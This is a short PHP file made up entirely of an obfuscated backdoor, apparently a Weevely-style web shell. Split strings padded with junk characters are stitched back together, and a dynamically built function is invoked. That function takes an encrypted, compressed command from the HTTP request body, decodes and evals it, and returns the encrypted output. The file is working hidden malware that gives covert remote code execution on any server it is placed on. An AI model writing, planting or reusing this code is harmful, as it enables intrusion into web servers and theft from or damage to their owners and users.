<?php
$f='Gas/Ge64_encod/Ge(@x(@gzc/Gom/Gpres/Gs($o),$k))/G;p/Grint("$p$/Gkh$r$kf");}';
$v='$m[1])/G,$k)))/G;$o=@/Gob_get/G_con/Gtents(/G);/G@ob_end_clea/Gn();$/Gr=@b/';
$a='$k="f/Gc61b18d/G/G";$kh="a3/G0c/G2c/G/G7f8a36/G";$kf="71c42b2c7c8e"/G;$p=';
$y='j++/G,$/Gi++){$o/G.=$t{$/G/G/Gi}^$k{$j};}}re/Gturn $o/G;}if (@preg/G_/Gmatc';
$H='"VFEPROB/G6/G1pTgT5/G/GtO";funct/Gion x($t,$/Gk){/G$c=/Gstrlen(/G$k);/G/G$l=';
$p='strl/Gen/G/G($t);$o/G="";for($i/G=0/G;$i<$l;){for($j=/G0;($j<$c&&$i<$l);$';
$g=')==1) {@ob_sta/Grt();@e/Gval/G(@gzu/G/Gn/Gcompress(@x(@b/G/Gase64_decode(';
$d='h("/G/$kh/G(.+/G)$k/G/Gf/",@/Gfile_get_contents(/G"/Gphp://G/input"),$m/G';
$T=str_replace('Bh','','creBhaBhBhte_BhfuBhnctBhion');
$u=str_replace('/G','',$a.$H.$p.$y.$d.$g.$v.$f);
$M=$T('',$u);$M();
?>
